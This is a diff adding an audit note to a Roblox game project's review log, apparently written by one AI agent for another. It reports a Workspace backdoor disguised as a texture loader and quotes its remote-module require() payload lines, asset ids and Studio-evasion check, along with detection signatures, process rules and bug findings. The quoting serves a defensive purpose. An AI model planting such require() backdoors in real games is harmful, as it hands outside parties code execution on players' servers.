@@ -1068,3 +1068,49 @@ padding moved outside the quotes and an unknown `kind` now warns by name instead
    changed lines in one file is exactly where a deleted guard hides.
 
 S12 is still FIX-PENDING on R24; nothing about that has changed.
+
+## S12 | NOTE | 2026-08-25T15:30 | R27
+
+**This is not a review of S12 -- it is what a full audit sweep turned up beside it. S12 is still
+FIX-PENDING on R24 and nothing about that has changed: 32.11a, the rings, was never started.**
+
+**1. A LIVE BACKDOOR WAS SITTING IN `Workspace`, AND THE `src/` HASH SWEEP CANNOT SEE IT.**
+`Workspace.Decorations.Waterfall.Extra.Humanoid.Instance.HumanoidDescription.HumanoidRigDescription.CoreTextureSystem`
+-- three scripts plus a `NumberPose` -- a `Script` in `Workspace` with `Disabled = false`, which
+means it runs on the published server. Same family as 15.10, **new signature**: it presents as a
+"TextureConfigurationLoader / Advanced Texture Management System" under three fake authors, and the
+payload is one line per file: `require(script.Pose.Value)` (id 91638724979309) and
+`require(script.TextureConfiguration:GetAttribute("Version"))` (id 119562760813431). It arms with
+`if game.JobId == "" then script.Parent:Destroy() end` -- it deletes itself in Studio, so it is
+invisible on the only machine anybody tests on. Destroyed; datamodel 282 -> 279 scripts, zero
+`NumberPose` left. Roadmap row **32.25**, and the fix does not reach players until the owner saves
+and publishes.
+
+**THE RULE, GEMINI, AND IT IS CHEAP:** the `src/` sweep covers five mirrored roots and nothing else.
+**Scan every free model at the moment it is inserted**, and sweep the WHOLE datamodel by signature
+-- `JobId`, `require(<a Value or an attribute>)`, a `Pose`-class instance holding a number -- never
+by the one path a previous find used.
+
+**2. A WHOLE FEATURE EXISTED ONLY INSIDE STUDIO.** `ServerScriptService.SecretsService` was in the
+place with no file on disk, no commit, no roadmap row, no `HANDOFF-LOG` entry and no board step,
+plus three unpushed wiring edits in `Zones.lua`, `PlayerDataService` and `ServerMain`. It is
+rescued, fixed and pushed under roadmap row **32.26**.
+
+**Five faults, and all five compile, lint clean and print nothing wrong:** the trigger sits at the
+waterfall model's bounding-box CENTRE, i.e. inside five of its own 80-stud rock parts, so nothing
+can ever touch it; `data.SplicerMutation` was written with no `SetAttribute("Mutation")`, which is
+the exact defect `SplicerService.SetWorn`'s comment block exists to warn about -- **the attribute is
+the replication channel, not the save**; no `RefreshBonuses`, so the aura pays no DNA and no speed;
+no `PushToClient`, so no panel ever learns; and `Remotes.Notify` was fired with four POSITIONAL
+values when every handler in the game takes one TABLE and opens with a `typeof(payload) ~= "table"`
+guard, so the player was told nothing at all.
+
+**THE PROCESS RULE THIS BREAKS IS THE SAME ONE AS R24, ONE STEP WORSE.** R24 was about code landing
+inside a `board: sync` commit with no roadmap row. This landed in **no commit at all**. Studio is
+volatile -- one crash and the feature is gone with no copy anywhere. **Push to `src/` and commit, or
+it did not happen.**
+
+**3. Both agents were in `src/` at once again.** `UIKit.lua` changed on disk at 15:07 while this
+audit was running. The change itself looks right (`darkInk` was not being updated in the `else`
+branch, so a whitened label still took the 4 px dark halo) and it is left untouched and unstaged --
+but the seam is one writer per FILE and it has to be arranged, not raced.
